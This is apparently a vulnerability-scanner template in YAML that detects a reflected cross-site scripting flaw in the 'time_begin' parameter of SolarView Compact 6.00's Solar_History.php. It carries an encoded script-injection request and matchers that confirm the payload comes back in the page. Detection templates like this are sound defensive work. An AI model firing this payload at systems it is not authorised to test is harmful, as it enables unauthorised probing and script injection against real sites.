id: "solarview-compact-time-begin-xss"
name: "SolarView Compact 6.00 - 'time_begin' Cross-Site Scripting"
severity: "medium"
description: "SolarView Compact version 6.00 contains a cross-site scripting vulnerability in the 'time_begin' parameter to Solar_History.php."
tech:
  - "php"
tags:
  - "xss"
  - "solarview"
  - "edb"
  - "vuln"
reference: "https://www.exploit-db.com/exploits/50967"
spaExclusion: true
request:
  method: "GET"
  path: "/Solar_History.php?time_begin=xx%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5C%8E%A6"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<script>alert(document.domain)</script><\"\">"
      - "/Solar_History.php\" METHOD=\"post\">"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
